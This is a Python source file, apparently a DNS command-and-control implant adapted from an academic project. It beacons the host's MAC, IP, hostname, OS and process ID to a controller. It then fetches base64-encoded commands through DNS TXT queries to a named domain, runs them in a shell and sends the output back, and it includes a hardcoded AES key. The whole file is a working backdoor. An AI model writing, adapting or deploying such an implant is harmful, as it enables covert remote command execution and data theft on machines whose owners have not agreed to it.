# -*- coding: utf-8 -*-
#!/usr/bin/env python

# Majority of code is based on cyberghost: https://github.com/illinoistech-itm/cyberghost

from Crypto.Cipher import AES
import argparse
import json
import os
import platform
import base64
import struct
import hashlib
import socket
import random
import subprocess
import os.path
import time
from ftplib import FTP
from uuid import getnode as get_mac

HOST = ''
DNS_IP = "10.150.0.8"
DNS_PORT = 53
DNS_SIGNAL_PORT = 1004
DOMAIN = "cmd.bark-bark.tree"

class LightLoop:

    def __init__(self):
        self.mac = str(format(get_mac(), 'x'))
        self.ip = self.get_ip()

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        host = socket.gethostname()
        platform_name=platform.system().lower()
        pid=str(os.getpid()) 
        content = self.mac + ";" + self.ip + ";" + host + ";" + platform_name + ";" + pid
        sock.sendto(content.encode('utf-8'), (DNS_IP, DNS_SIGNAL_PORT))
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock1.bind((HOST, DNS_PORT))
        while True:
            print("Waiting for command signal...")
            data, addr = sock1.recvfrom(512)
            print("[-] Signal received!")
            packet = self.build_packet(DOMAIN)
            print("Sending packet...")
            sock1.sendto(bytes(packet), (DNS_IP, DNS_PORT))
            data, addr = sock1.recvfrom(1024)
            print("Response received!")
            txtlength = data[48]
            txt = data[49:(49+txtlength)]
            msgs = (txt.decode('utf-8')).split(';')
            to = int(msgs[1])

            command = (base64.b64decode(msgs[0])).decode('utf-8')
            print("Executing the following command:", command, "- with timeout:", to)
            try:
                res = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=to)
            except subprocess.CalledProcessError as e:
                res = e.output
            sock.sendto(base64.b64encode(res), (DNS_IP, DNS_SIGNAL_PORT))

    def get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((DNS_IP, 0))
        return s.getsockname()[0]

    def build_packet(self, url):
        packet = struct.pack(">H", random.randint(0, 65535))  # Query Id
        packet += struct.pack(">H", 256)  # Flags
        packet += struct.pack(">H", 1)  # Questions
        packet += struct.pack(">H", 0)  # Answers
        packet += struct.pack(">H", 0)  # Authorities
        packet += struct.pack(">H", 0)  # Additional
        split_url = url.split(".")
        for part in split_url:
            packet += struct.pack("B", len(part))
            for char in part:
                packet += struct.pack("c", bytes(char, 'utf-8'))
        packet += struct.pack("B", 0)  # End of String
        packet += struct.pack(">H", 16)  # Query Type (TXT)
        packet += struct.pack(">H", 1)  # Query Class (IN)
        return packet

    # utils
    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        key = hashlib.sha256("g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp".encode()).digest()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _unpad(self, s):
        return s[:-ord(s[len(s)-1:])]


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-D', '--dns', required=False, default='10.150.0.8')
    args = parser.parse_args()
    DNS_IP = args.dns
    try:
        LightLoop().start()
    except Exception as e:
        print('[-] DNS may not be accessible, or: %s' % e)
